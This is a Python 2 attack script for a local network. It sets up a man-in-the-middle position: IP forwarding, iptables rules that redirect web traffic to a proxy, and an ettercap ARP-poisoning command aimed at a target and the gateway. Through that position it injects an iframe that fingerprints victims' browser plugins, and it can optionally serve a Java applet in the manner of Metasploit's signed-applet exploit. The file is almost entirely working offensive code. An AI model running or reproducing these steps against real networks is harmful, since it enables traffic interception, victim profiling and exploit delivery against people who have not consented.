from threading import Thread
from SocketServer import ThreadingMixIn
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
import string,cgi,time,urlparse,commands,os,subprocess
from os import curdir, sep

javaSelfsigned=False

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if 'fingerprint.html' in self.path:
                f = open(curdir + sep + self.path, 'rb')
		self.send_response(200)
                self.send_header('Content-type',    'text/html')
                self.end_headers()
                self.wfile.write(f.read())
                f.close()
                return		
        else:
            parsed_path = urlparse.urlparse(self.path)
            message_parts = [
                    'client_address=%s (%s)' % (self.client_address,
                                                self.address_string()),
                    'query=%s' % parsed_path.query,
                    ]
            for name, value in sorted(self.headers.items()):
                message_parts.append('%s=%s' % (name, value.rstrip()))
            message_parts.append('')
            message = '\r\n'.join(message_parts)
            self.send_response(200)
            self.end_headers()
            for msg in message_parts:
                if 'client_address' in msg:
                    print "Target: "+msg.split(") (")[1].strip(")")
                if 'query' in msg:
                    pluginVer = msg.replace("query=","").split('&')
		    for i in pluginVer:
			if i:
				pdtName,pdtVer = i.split("=")
				pdtVer = pdtVer.replace(",",".")
				print pdtName+'\t'+pdtVer
            return

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""     

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

def getIP():
    cmd = "route -n | grep 'UG' | awk '{print $8}'"
    iface = commands.getstatusoutput(cmd)[1]
    cmd = "ifconfig "+iface+" | grep 'inet ' | awk '{print $2}' | cut -d':' -f 2"
    ipAddr = commands.getstatusoutput(cmd)[1]
    return ipAddr

def modifyHTML(filename):
    content = []
    
    ipAddr = getIP()
    with open(filename) as f:
    	for line in f:
		if '$.get(' in line:
			replaceLine = "		$.get('http://"+ipAddr+":9090/scan?'+ params, function(data) {"
			content.append(replaceLine)
		elif '<body>' in line:
			content.append(line)
			if javaSelfsigned==True:
				content.append('<applet archive="http://'+ipAddr+':8081/java/Microsoft.jar" code="Microsoft" width="1" height="1"></applet>')
		else:
			content.append(line)
    fo = open("fingerprint.html", "w+") 
    fo.writelines(content)
    fo.close()
def setupForwarding():
	print "[*] Setup forwarding"
	cmd = "sysctl -w net.ipv4.ip_forward=1"
	subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
	cmd = "echo '1' > /proc/sys/net/ipv4/ip_forward"
	subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
	cmd = "iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080"
	subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
	cmd = "iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080"

def startMITMproxy():
	setupForwarding()
	cmd = 'screen -dmS mitm'
	subprocess.Popen(cmd, shell=True)
	cmdStr = 'cd '+os.getcwd()
	cmd = 'screen -S mitm -X stuff "'+cmdStr+'^m"'
	subprocess.Popen(cmd, shell=True)
        ipAddr = getIP()
	cmdStr = 'python iframe_injector http://'+ipAddr+':9090/fingerprint.html'
	cmd = 'screen -S mitm -X stuff "'+cmdStr+'^m"'
	subprocess.Popen(cmd, shell=True)
	#cmd = 'screen  -S hello  -X stuff "ping 4.2.2.2^m"

def setupMetasploit():
	ipAddr = getIP()
	#"use exploit/multi/browser/java_signed_applet"
	#"set SRVHOST "+ipAddr
	#"set SRVPORT 8081"
	#"set URIPATH /java"

def main():
    try:
	#Get Gateway
	cmd = "route -n | awk '$2 ~/[1-9]+/ {print $2;}'"
	gatewayIP = commands.getstatusoutput(cmd)[1]
        server = ThreadedHTTPServer(('', 9090), Handler)
        print 'Started httpserver...'
	startMITMproxy()
	modifyHTML('fingerprint_template.html')
	print "[*] Run the below command in another terminal"
	print bcolors.OKGREEN+"ettercap -T -q -M ARP /targetIP/  /"+gatewayIP+"/"+bcolors.ENDC
        server.serve_forever()
    except KeyboardInterrupt:
        print '^C received, shutting down server'
	cmd = "killall screen"
	subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
        server.socket.close()

if __name__ == '__main__':
    main()
